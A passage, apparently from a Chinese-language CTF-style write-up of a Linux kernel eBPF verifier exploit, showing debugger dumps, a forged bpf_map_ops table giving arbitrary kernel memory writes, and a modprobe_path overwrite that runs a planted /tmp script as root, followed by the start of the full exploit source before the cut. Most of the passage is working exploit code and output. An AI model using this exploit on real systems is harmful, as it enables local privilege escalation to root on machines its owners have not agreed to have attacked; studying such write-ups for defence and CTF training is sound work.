        inner_map_meta = 0x0 ,
        security = 0xffff88800e93f0f8,
        map_type = 0x2 ,
        key_size = 0x4 ,
        value_size = 0x2000 , 
        max_entries = 0x1 ,
    //...    
        usercnt = {    
    //..
          wait_list = {
            next = 0xffff88800d8780c0,//
      },
      elem_size = 0x2000 ,
      index_mask = 0x0 ,
      aux = 0x0 ,
      {
        value = 0xffff88800d878110,//`, 改成我们自己的`fake_ops`,
因为前面我们已经泄露出map 的地址了，那么完全可以用`map_update_elem` 伪造一个`ops`,
然后改一下指针就可以劫持控制流了，zdi上的writeup 用了一个更好的办法。
    gef➤  p/a *(struct bpf_map_ops *)0xffffffff82016340
    $11 = {
      map_alloc_check = 0xffffffff8116ec70 ,
      map_alloc = 0xffffffff8116fa00 ,
      map_release = 0x0 ,
      map_free = 0xffffffff8116f2d0 ,
      map_get_next_key = 0xffffffff8116ed50 ,
      map_release_uref = 0x0 ,
      map_lookup_elem_sys_only = 0x0 ,
      map_lookup_batch = 0xffffffff81159b30 ,
      map_lookup_and_delete_batch = 0x0 ,
      map_update_batch = 0xffffffff81159930 ,
      map_delete_batch = 0x0 ,
      map_lookup_elem = 0xffffffff8116edd0 ,
      map_update_elem = 0xffffffff8116f1c0 ,
      map_delete_elem = 0xffffffff8116ed80 ,
      map_push_elem = 0x0 ,
      map_pop_elem = 0x0 ,
      map_peek_elem = 0x0 ,
      map_fd_get_ptr = 0x0 ,
      map_fd_put_ptr = 0x0 ,
      map_gen_lookup = 0xffffffff8116f050 ,
      map_fd_sys_lookup_elem = 0x0 ,
      map_seq_show_elem = 0xffffffff8116ee80 ,
      map_check_btf = 0xffffffff8116f870 ,
      map_poke_track = 0x0 ,
      map_poke_untrack = 0x0 ,
      map_poke_run = 0x0 ,
      map_direct_value_addr = 0xffffffff8116ece0 ,
      map_direct_value_meta = 0xffffffff8116ed10 ,
      map_mmap = 0xffffffff8116ee50 
    }
`map_push_elem` 会在 `map_update_elem` 的时候被调用, 它需要map
的类型是`BPF_MAP_TYPE_QUEUE`或者`BPF_MAP_TYPE_STACK`, 但是没有关系， map 上的任何内容都可以用 `r7`
来改，把`map_type` 改成`BPF_MAP_TYPE_STACK` (0x17)之后，每次调用`map_update_elem`时,
就会调用`map_push_elem`
     static int bpf_map_update_value(struct bpf_map *map, struct fd f, void *key,  
                    void *value, __u64 flags)                                     
    {                                                                             
    //...                    
        } else if (map->map_type == BPF_MAP_TYPE_QUEUE ||     
            ¦  map->map_type == BPF_MAP_TYPE_STACK) {         
            err = map->ops->map_push_elem(map, value, flags); 
    //..
在 `fake_ops` 上, 我们把`map_push_elem` 改成`map_get_next_key` 一样的地址，
这里实际的`map_get_next_key`是函数`array_map_get_next_key`
    uint64_t fake_map_ops[]={
        kaslr +0xffffffff8116ec70,                 
        kaslr +0xffffffff8116fa00,                 
        0x0,                                       
        kaslr +0xffffffff8116f2d0,                 
        kaslr +0xffffffff8116ed50,// 5: map_get_next_key  
        0x0,                                       
        //...                
        kaslr +0xffffffff8116ed80,                 
        kaslr +0xffffffff8116ed50,//15: map_push_elem 
        0x0,                                       
        0x0,                                       
        //...                
    }
`array_map_get_next_key` 实现在`kernel/bpf/arraymap.c#L279` 上， 传递给`map_push_elem`
的参数是`value`(ring3 要update的数据)和 `uattr` 的 flags, 分别对应`array_map_get_next_key` 的
`key` 和 `next_key` 参数
    static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)   
    {                                                                                   
        struct bpf_array *array = container_of(map, struct bpf_array, map);             
        u32 index = key ? *(u32 *)key : U32_MAX;                                        
        u32 *next = (u32 *)next_key;                                                    
        if (index >= array->map.max_entries) {    //index                                      
            *next = 0;                                                                  
            return 0;                                                                   
        }                                                                               
        if (index == array->map.max_entries - 1)                                        
            return -ENOENT;                                                             
        *next = index + 1;                                                              
        return 0;                                                                       
    }
加入我们运行 `map_update_elem(mapfd, &key, &value, flags)`, 运行到
`array_map_get_next_key` 之后有
`index == value[0]`, `next = flags` ， 最终效果是 `*flags = value[0]`
value[0] 和 flags 都是 ring3 下传入的值，前面我们已经泄露了内核地址，于是就可以通过修改 `flags`
的值写任意内存啦。写入的index要满足`(index >= array->map.max_entries)`, `map_entries` 可以用`r7`
改成`0xffff ffff`
这里index 和 next 都是 u32 类型， 所以就是任意地址写 4个byte.
具体的操作是
  * 1 写 r7 改写 ops 到 fake_ops ( map_push_elem 改成`array_map_get_next_key` 地址)
  * 2 修改 map 的一些字段绕过一些检查 
    * spin_lock_off = 0
    * max_entries = `0xffff ffff`
    * map_type = `BPF_MAP_TYPE_STACK`
  * 3 调用 `map_update_elem` 写内存
###  改modprobe_path 用root任意命令
可以任意地址写这个能力还是挺大的了，zdi 的writeup 上是通过搜索 `init_pid_ns`， 找到当前的`task_struct`, 然后写
cred 来获取一个 root shell。
既然已经可以任意地址写了，这里我的做法是改写`modprobe_path` , 然后就可以用root 权限执行任意指令了，虽然不能起root shell，
但是也是可以达到提权目的了(主要是懒 😛 )
`/tmp` 目录下生成 `/tmp/chmod` 和 `/tmp/fake` , `/tmp/chmod` 可以改 `/flag` 文件的权限
    void gen_fake_elf(){                                                       
        system("echo -ne '#!/bin/shn/bin/chmod 777 /flagn' > /tmp/chmod");   
        system("chmod +x /tmp/chmod");                                         
        system("echo -ne '\xff\xff\xff\xff' > /tmp/fake");                 
        system("chmod +x /tmp/fake");                                          
    }
然后把`modprobe_path` 改成 `/tmp/chmod`, 然后运行 `/tmp/fake` 就完事啦
     expbuf64[0] = 0x706d742f -1;                              
     bpf_update_elem(expmapfd,&key,expbuf,modprobe_path);      
     expbuf64[0] = 0x6d68632f -1;                              
     bpf_update_elem(expmapfd,&key,expbuf,modprobe_path+4);    
     expbuf64[0] = 0x646f -1;                                  
     bpf_update_elem(expmapfd,&key,expbuf,modprobe_path+8);
## exp
完整exp 如下，这里需要有两个头文件，`bpf_insn.h` 在`samples/bpf/bpf_insn.h` 下， 主要是生成指令的一些宏定义。
因为我本机的ubuntu 内核还不支持`BPF_JMP32` 所以还需要拷贝一个`bpf.h` ，它在`include/uapi/linux/bpf.h`
整理一下 `bpf_insns` 都做了什么， 这里我创建了两个map( `ctrlmap` 和 `expmap`, 有点乱…)
第一次 `writemsg()` （ `ctrlmap[0] = 2; ctrlmap[1] = 0`）
  * `r9 指向 ctrlmap[0]` , load 之后 `r6 ==2`
  * 然后前面描述的漏洞触发过程， 最后 `BPF_ALU64_IMM(BPF_MUL,6,0x110)`, 得到 `r6 == 0x100`
  * `r7 指向 expmap[0]`, 然后 sub r6, 获取 `bpf_map_ops`和 map 的地址，写入到 `ctrlmap[0][0x10]ctrlmap[0][0x18]` 的位置
  * exp 中 `map_lookup_elem` 获取 泄露的地址
第二次 `writemsg()` （ `ctrlmap[0] = 2; ctrlmap[1] = 1`)
  * 把 `fake_map_ops` 保存到 `expmap[0]` 上, 修改原来的 `ops` 指向`fake_map_ops`
  * 改 `spin_lock_off`, `max_entries` ,`map_type`
  * `map_update_elem` 改 `modprobe_path`
    #define _GNU_SOURCE
    #include        
    #include       
    #include       
    #include        
    #include       
    #include       
    #include    
    #include  
    #include   
    #include        
    #include "linux/bpf.h"   
    #include "bpf_insn.h"    
    int ctrlmapfd, expmapfd;
    int progfd;
    int sockets[2];
    #define LOG_BUF_SIZE 65535
    char bpf_log_buf[LOG_BUF_SIZE];
    void gen_fake_elf(){
        system("echo -ne '#!/bin/shn/bin/chmod 777 /flagn' > /tmp/chmod"); 
        system("chmod +x /tmp/chmod");
        system("echo -ne '\xff\xff\xff\xff' > /tmp/fake");
        system("chmod +x /tmp/fake");
    }
    void init(){
        setbuf(stdin,0);
        setbuf(stdout,0);
        gen_fake_elf();
    }
    void x64dump(char *buf,uint32_t num){         
        uint64_t *buf64 =  (uint64_t *)buf;       
        printf("[-x64dump-] start : n");         
        for(int i=0;i<num;i++){                   
                if(i%2==0 && i!=0){                   
                    printf("n");                     
                }                                     
                printf("0x%016lx ",*(buf64+i));       
            }                                         
        printf("n[-x64dump-] end ... n");       
    }                                             
    void loglx(char *tag,uint64_t num){         
        printf("[lx] ");                        
        printf(" %-20s ",tag);                  
        printf(": %-#16lxn",num);              
    }                                           
    static int bpf_prog_load(enum bpf_prog_type prog_type,         
            const struct bpf_insn *insns, int prog_len,  
            const char *license, int kern_version);      
    static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
            int max_entries);                                                 
    static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
    static int bpf_lookup_elem(int fd,void *key, void *value);
    static void writemsg(void);
    static void __exit(char *err);
    struct bpf_insn insns[]={
        BPF_LD_MAP_FD(BPF_REG_1,3),
        BPF_ALU64_IMM(BPF_MOV,6,0),
        BPF_STX_MEM(BPF_DW,10,6,-8),
        BPF_MOV64_REG(7,10),
        BPF_ALU64_IMM(BPF_ADD,7,-8),
        BPF_MOV64_REG(2,7),
        BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0,
                BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE,0,0,1),
        BPF_EXIT_INSN(),
        // r9 = ctrlmap[0]
        BPF_MOV64_REG(9,0),
        //2
        BPF_LDX_MEM(BPF_DW,6,9,0),
        // offset
        /*// BPF_JGE 看 tnum  umin 1*/
        BPF_ALU64_IMM(BPF_MOV,0,0),
        BPF_JMP_IMM(BPF_JGE,6,1,1),
        BPF_EXIT_INSN(),
        BPF_MOV64_IMM(8,0x1),
        BPF_ALU64_IMM(BPF_LSH,8,32),
        BPF_ALU64_IMM(BPF_ADD,8,1),
         /*BPF_JLE 看 tnum  umax 0x100000001*/
        BPF_JMP_REG(BPF_JLE,6,8,1),
        BPF_EXIT_INSN(),